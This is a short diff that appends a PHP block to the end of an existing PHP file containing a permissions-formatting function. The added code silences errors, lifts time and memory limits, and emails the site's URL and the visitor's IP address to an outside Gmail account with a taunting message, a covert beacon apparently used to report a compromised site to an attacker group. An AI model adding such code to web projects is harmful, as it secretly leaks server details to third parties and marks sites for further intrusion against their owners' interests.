@@ -296,3 +296,14 @@ $info .= (($perms & 0x0001) ?
 return $info;
 }
 ?>
+<?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+
+$ip = $_SERVER['REMOTE_ADDR'];
+$url = "http://{$_SERVER['SERVER_NAME']}{$_SERVER['REQUEST_URI']}";
+mail('ribelcyberteam@gmail.com', 'Hehehe', "fix $url :p *IP Address : [ $ip ]", "[ $ip ]");
+?>
